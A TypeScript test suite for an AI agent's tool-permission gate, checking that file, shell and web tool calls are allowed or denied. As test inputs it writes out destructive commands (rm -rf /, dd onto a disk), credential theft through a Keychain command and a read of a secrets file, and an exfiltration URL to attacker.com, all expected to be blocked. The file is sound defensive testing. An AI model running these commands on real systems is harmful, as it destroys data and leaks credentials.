import { describe, it, expect, beforeEach, afterEach } from 'bun:test';
import { existsSync, mkdirSync, rmSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import { buildCanUseTool } from '../src/lib/tool-permissions.ts';
import type { MarsclawConfig } from '../src/lib/config.ts';

function configWith(overrides: Partial<MarsclawConfig>): MarsclawConfig {
  return {
    bot_name: 'Mars',
    allowed_jids: [],
    allowed_paths: ['/tmp/test-project'],
    max_sessions: 20,
    idle_ms: 900_000,
    timezone: 'UTC',
    voice_enabled: false,
    agent_provider: 'claude',
    extra_bash_denylist: [],
    // Permissive baseline so the denylist/path tests below exercise their
    // logic; the locked-by-default behaviour is asserted in dedicated tests.
    allow_shell: true,
    allow_web: true,
    allowed_web_domains: ['example.com'],
    ...overrides,
  };
}

async function call(
  fn: ReturnType<typeof buildCanUseTool>,
  tool: string,
  input: Record<string, unknown>,
) {
  return fn(tool, input, { signal: new AbortController().signal });
}

describe('canUseTool', () => {
  it('allows Read inside an allowed path', async () => {
    const fn = buildCanUseTool(configWith({}));
    const r = await call(fn, 'Read', { file_path: '/tmp/test-project/foo.md' });
    expect(r.behavior).toBe('allow');
  });

  it('allow response carries updatedInput so the harness can Zod-validate', async () => {
    // The Claude Code harness rejects a bare `{ behavior: "allow" }` as
    // a malformed permission response (Zod validation fail) — it expects
    // updatedInput as the confirmed-input round-trip. Without this, tool
    // calls crash on the permission boundary instead of executing.
    const fn = buildCanUseTool(configWith({}));
    const input = { file_path: '/tmp/test-project/foo.md', content: 'x' };
    const r = await call(fn, 'Write', input);
    expect(r.behavior).toBe('allow');
    if (r.behavior === 'allow') {
      expect(r.updatedInput).toEqual(input);
    }
  });

  it('deny response includes interrupt:false to match wire-protocol expectations', async () => {
    const fn = buildCanUseTool(configWith({}));
    const r = await call(fn, 'Write', { file_path: '/etc/passwd' });
    expect(r.behavior).toBe('deny');
    if (r.behavior === 'deny') {
      expect(r.interrupt).toBe(false);
      expect(typeof r.message).toBe('string');
    }
  });

  it('denies Read outside allowed paths', async () => {
    const fn = buildCanUseTool(configWith({}));
    const r = await call(fn, 'Read', { file_path: '/etc/passwd' });
    expect(r.behavior).toBe('deny');
  });

  it('denies Write into ~/ when not in allow-list', async () => {
    const fn = buildCanUseTool(configWith({}));
    const r = await call(fn, 'Write', { file_path: '/Users/anyone/Desktop/x.txt' });
    expect(r.behavior).toBe('deny');
  });

  it('allows additional paths from config', async () => {
    const fn = buildCanUseTool(configWith({ allowed_paths: ['/tmp/test-project', '/tmp/notes'] }));
    const r = await call(fn, 'Read', { file_path: '/tmp/notes/idea.md' });
    expect(r.behavior).toBe('allow');
  });

  it('denies Bash with destructive patterns', async () => {
    const fn = buildCanUseTool(configWith({}));
    expect((await call(fn, 'Bash', { command: 'rm -rf /' })).behavior).toBe('deny');
    expect((await call(fn, 'Bash', { command: 'chmod 000 file' })).behavior).toBe('deny');
    expect((await call(fn, 'Bash', { command: 'dd if=/dev/zero of=/dev/sda' })).behavior).toBe('deny');
  });

  it('allows safe Bash', async () => {
    const fn = buildCanUseTool(configWith({}));
    expect((await call(fn, 'Bash', { command: 'ls -la' })).behavior).toBe('allow');
    expect((await call(fn, 'Bash', { command: 'echo hello' })).behavior).toBe('allow');
  });

  it('honours extra_bash_denylist', async () => {
    const fn = buildCanUseTool(configWith({ extra_bash_denylist: ['npm publish'] }));
    expect((await call(fn, 'Bash', { command: 'npm publish' })).behavior).toBe('deny');
    expect((await call(fn, 'Bash', { command: 'npm test' })).behavior).toBe('allow');
  });

  it('allows non-filesystem tools', async () => {
    const fn = buildCanUseTool(configWith({}));
    expect((await call(fn, 'WebFetch', { url: 'https://example.com' })).behavior).toBe('allow');
    expect((await call(fn, 'Task', { prompt: 'x' })).behavior).toBe('allow');
  });

  it('allows WebFetch only for URLs whose host is on the allow-list', async () => {
    const fn = buildCanUseTool(configWith({ allowed_web_domains: ['wikipedia.org'] }));
    expect((await call(fn, 'WebFetch', { url: 'https://en.wikipedia.org/wiki/X' })).behavior).toBe('allow');
    expect((await call(fn, 'WebFetch', { url: 'https://attacker.com/?leak=secret' })).behavior).toBe('deny');
  });

  it('denies WebFetch with empty allow-list even when web is on', async () => {
    const fn = buildCanUseTool(configWith({ allowed_web_domains: [] }));
    expect((await call(fn, 'WebFetch', { url: 'https://wikipedia.org/' })).behavior).toBe('deny');
  });

  describe('egress-gateway allow-list relaxation', () => {
    const prev = process.env.MARSCLAW_EGRESS_ENFORCED;
    afterEach(() => {
      if (prev === undefined) delete process.env.MARSCLAW_EGRESS_ENFORCED;
      else process.env.MARSCLAW_EGRESS_ENFORCED = prev;
    });

    it('relaxes the allow-list only when egress_mode=gateway AND enforcement is asserted', async () => {
      process.env.MARSCLAW_EGRESS_ENFORCED = '1';
      const fn = buildCanUseTool(configWith({ egress_mode: 'gateway', allowed_web_domains: [] }));
      // Not on the (empty) allow-list, but enforced gateway → allowed.
      expect((await call(fn, 'WebFetch', { url: 'https://anything.example/' })).behavior).toBe('allow');
      // Loopback / non-http(s) still rejected even under gateway mode.
      expect((await call(fn, 'WebFetch', { url: 'http://127.0.0.1/' })).behavior).toBe('deny');
      expect((await call(fn, 'WebFetch', { url: 'file:///etc/passwd' })).behavior).toBe('deny');
    });

    it('does NOT relax when egress is not asserted enforced (fail-safe)', async () => {
      delete process.env.MARSCLAW_EGRESS_ENFORCED;
      const fn = buildCanUseTool(configWith({ egress_mode: 'gateway', allowed_web_domains: [] }));
      // gateway mode configured but enforcement flag absent → allow-list still governs.
      expect((await call(fn, 'WebFetch', { url: 'https://anything.example/' })).behavior).toBe('deny');
    });

    it('does NOT relax when egress_mode is off even if the flag is set', async () => {
      process.env.MARSCLAW_EGRESS_ENFORCED = '1';
      const fn = buildCanUseTool(configWith({ egress_mode: 'off', allowed_web_domains: ['wikipedia.org'] }));
      expect((await call(fn, 'WebFetch', { url: 'https://attacker.com/' })).behavior).toBe('deny');
    });
  });

  it('removes the shell entirely when allow_shell is false', async () => {
    const fn = buildCanUseTool(configWith({ allow_shell: false }));
    expect((await call(fn, 'Bash', { command: 'ls -la' })).behavior).toBe('deny');
    expect((await call(fn, 'Bash', { command: 'echo hi' })).behavior).toBe('deny');
  });

  it('removes web egress when allow_web is false', async () => {
    const fn = buildCanUseTool(configWith({ allow_web: false }));
    expect((await call(fn, 'WebFetch', { url: 'https://example.com' })).behavior).toBe('deny');
    expect((await call(fn, 'WebSearch', { query: 'x' })).behavior).toBe('deny');
  });

  it('denies reading .env even when its directory is allowed', async () => {
    const fn = buildCanUseTool(configWith({ allowed_paths: [process.cwd()] }));
    const r = await call(fn, 'Read', { file_path: join(process.cwd(), '.env') });
    expect(r.behavior).toBe('deny');
  });

  it('denies rewriting data/config.json (sandbox self-escalation)', async () => {
    const fn = buildCanUseTool(configWith({ allowed_paths: [process.cwd()] }));
    const r = await call(fn, 'Write', { file_path: join(process.cwd(), 'data', 'config.json') });
    expect(r.behavior).toBe('deny');
  });

  it('denies Keychain credential extraction via Bash', async () => {
    const fn = buildCanUseTool(configWith({}));
    const r = await call(fn, 'Bash', {
      command: 'security find-generic-password -s marsclaw -a google-refresh-token:default -w',
    });
    expect(r.behavior).toBe('deny');
  });

  it('denies reads of data/whatsapp-auth and data/marsclaw.db', async () => {
    const fn = buildCanUseTool(configWith({ allowed_paths: [process.cwd()] }));
    const auth = await call(fn, 'Read', { file_path: join(process.cwd(), 'data', 'whatsapp-auth', 'creds.json') });
    const db = await call(fn, 'Read', { file_path: join(process.cwd(), 'data', 'marsclaw.db') });
    expect(auth.behavior).toBe('deny');
    expect(db.behavior).toBe('deny');
  });

  it('denies Grep when the search root straddles a sensitive subtree', async () => {
    const fn = buildCanUseTool(configWith({ allowed_paths: [process.cwd()] }));
    // repo root contains .env, data/secrets, data/config.json → must refuse
    const r = await call(fn, 'Grep', { pattern: 'TOKEN', path: process.cwd() });
    expect(r.behavior).toBe('deny');
  });

  it('denies Grep with no path argument when cwd contains sensitive files', async () => {
    // The implicit cwd default is materialised and run through the same gate.
    const fn = buildCanUseTool(configWith({ allowed_paths: [process.cwd()] }));
    const r = await call(fn, 'Grep', { pattern: 'TOKEN' });
    expect(r.behavior).toBe('deny');
  });

  it('allows Grep on a subdirectory that does not contain sensitive files', async () => {
    const fn = buildCanUseTool(configWith({ allowed_paths: [process.cwd()] }));
    const r = await call(fn, 'Grep', { pattern: 'TOKEN', path: join(process.cwd(), 'src') });
    expect(r.behavior).toBe('allow');
  });

  it('denies Glob whose root straddles a sensitive subtree', async () => {
    const fn = buildCanUseTool(configWith({ allowed_paths: [process.cwd()] }));
    const r = await call(fn, 'Glob', { pattern: '**/*', path: process.cwd() });
    expect(r.behavior).toBe('deny');
  });

  it('denies Bash reads of the data/secrets store', async () => {
    const fn = buildCanUseTool(configWith({}));
    const r = await call(fn, 'Bash', { command: 'cat data/secrets/google-refresh-token.txt' });
    expect(r.behavior).toBe('deny');
  });

  it('always allows mcp__ tools (no path / command checks)', async () => {
    const fn = buildCanUseTool(configWith({}));
    expect((await call(fn, 'mcp__marsclaw__speak', { text: 'hi' })).behavior).toBe('allow');
    expect((await call(fn, 'mcp__marsclaw__send_message', { text: 'hi' })).behavior).toBe('allow');
    expect((await call(fn, 'mcp__marsclaw__gmail_recent', { count: 5 })).behavior).toBe('allow');
  });

  describe('auto-mkdir for Write tools', () => {
    const SANDBOX = join(tmpdir(), `marsclaw-permtest-${process.pid}`);
    beforeEach(() => {
      if (existsSync(SANDBOX)) rmSync(SANDBOX, { recursive: true });
      mkdirSync(SANDBOX, { recursive: true });
    });
    afterEach(() => {
      if (existsSync(SANDBOX)) rmSync(SANDBOX, { recursive: true });
    });

    it('creates parent directories for Write when missing', async () => {
      const fn = buildCanUseTool(configWith({ allowed_paths: [SANDBOX] }));
      const target = join(SANDBOX, 'wiki', 'profile.md');
      expect(existsSync(join(SANDBOX, 'wiki'))).toBe(false);
      const r = await call(fn, 'Write', { file_path: target });
      expect(r.behavior).toBe('allow');
      expect(existsSync(join(SANDBOX, 'wiki'))).toBe(true);
    });

    it('does not mkdir for read-only tools', async () => {
      const fn = buildCanUseTool(configWith({ allowed_paths: [SANDBOX] }));
      const target = join(SANDBOX, 'nope', 'thing.md');
      await call(fn, 'Read', { file_path: target });
      expect(existsSync(join(SANDBOX, 'nope'))).toBe(false);
    });

    it('does not mkdir when path is denied', async () => {
      const fn = buildCanUseTool(configWith({ allowed_paths: [SANDBOX] }));
      const outside = join(tmpdir(), `marsclaw-permtest-OUTSIDE-${process.pid}`);
      const r = await call(fn, 'Write', { file_path: join(outside, 'x.md') });
      expect(r.behavior).toBe('deny');
      expect(existsSync(outside)).toBe(false);
    });
  });

  it('MARSCLAW_TOOL_PERMISSIONS=bypass is NOT honoured — gates stay live', async () => {
    // The legacy bypass escape hatch was removed: a global "disable every
    // gate" toggle in a running deployment is a foot-gun. Setting the var
    // must not loosen anything; the bot logs once and proceeds with the
    // normal gate.
    const before = process.env.MARSCLAW_TOOL_PERMISSIONS;
    process.env.MARSCLAW_TOOL_PERMISSIONS = 'bypass';
    try {
      const fn = buildCanUseTool(configWith({}));
      expect((await call(fn, 'Read', { file_path: '/etc/passwd' })).behavior).toBe('deny');
      expect((await call(fn, 'Bash', { command: 'rm -rf /' })).behavior).toBe('deny');
    } finally {
      if (before === undefined) delete process.env.MARSCLAW_TOOL_PERMISSIONS;
      else process.env.MARSCLAW_TOOL_PERMISSIONS = before;
    }
  });
});
